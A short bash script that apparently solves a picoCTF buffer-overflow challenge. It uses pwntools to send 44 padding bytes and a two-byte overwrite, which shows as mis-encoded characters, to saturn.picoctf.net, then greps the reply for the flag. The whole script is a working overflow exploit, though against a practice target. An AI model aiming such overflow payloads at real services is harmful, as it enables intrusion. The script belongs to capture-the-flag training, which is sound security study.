#!/bin/bash
port=60326
python3 -c "from pwn import *; host, port = 'saturn.picoctf.net', $port; p = remote(host, port); log.info(p.recvS()); p.sendline(b'A'*44 + b'ö‘'); log.success(p.recvallS()); p.close()" | grep -oE picoCTF{.*?} --color=none
